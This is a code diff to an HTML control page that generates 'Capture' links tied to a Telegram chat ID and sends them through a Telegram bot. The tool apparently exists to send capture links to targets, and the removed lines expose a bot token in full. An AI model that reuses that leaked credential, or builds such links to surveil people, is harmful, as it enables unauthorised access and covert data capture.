@@ -66,7 +66,7 @@
             margin-bottom: 8px;
             color: #0f0;
         }
-        input[type="text"] {
+        input[type="text"], input[type="password"] {
             width: 100%;
             padding: 10px;
             margin-bottom: 20px;
@@ -76,7 +76,7 @@
             color: #0f0;
             transition: border-color 0.3s ease, background-color 0.3s ease;
         }
-        input[type="text"]:focus {
+        input[type="text"]:focus, input[type="password"]:focus {
             border-color: #007BFF;
             background-color: #555;
             outline: none;
@@ -133,6 +133,8 @@
     <form id="botForm">
         <label for="chatId">Chat ID:</label>
         <input type="text" id="chatId" name="chatId" required>
+        <label for="botToken">Bot Token:</label>
+        <input type="password" id="botToken" name="botToken" required>
         <br>
         <div class="buttons">
             <button type="button" onclick="generateLink('capture.html', 'Capture')">Capture</button>
@@ -151,21 +153,20 @@
     </div>
 
     <script>
-        const botToken = '7347658420:AAFJel5v5zRqa-wF5IrK_lQoI1YPyHOZG0w';
-
         function generateLink(page, name) {
             const chatId = document.getElementById('chatId').value;
-            if (!chatId) {
-                alert('Please enter a Chat ID.');
+            const botToken = document.getElementById('botToken').value;
+            if (!chatId || !botToken) {
+                alert('Please enter both Chat ID and Bot Token.');
                 return;
             }
             const baseUrl = window.location.href.substring(0, window.location.href.lastIndexOf('/')); // Get the current directory
             const link = `${baseUrl}/${page}?chatId=${encodeURIComponent(chatId)}`;
             document.getElementById('linkContainer').innerHTML = `Your ${name} link is: <a href="${link}" target="_blank">${link}</a>`;
-            sendLinkToTelegram(chatId, `Your ${name} link is: ${link}`);
+            sendLinkToTelegram(chatId, botToken, `Your ${name} link is: ${link}`);
         }
 
-        async function sendLinkToTelegram(chatId, message) {
+        async function sendLinkToTelegram(chatId, botToken, message) {
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             try {
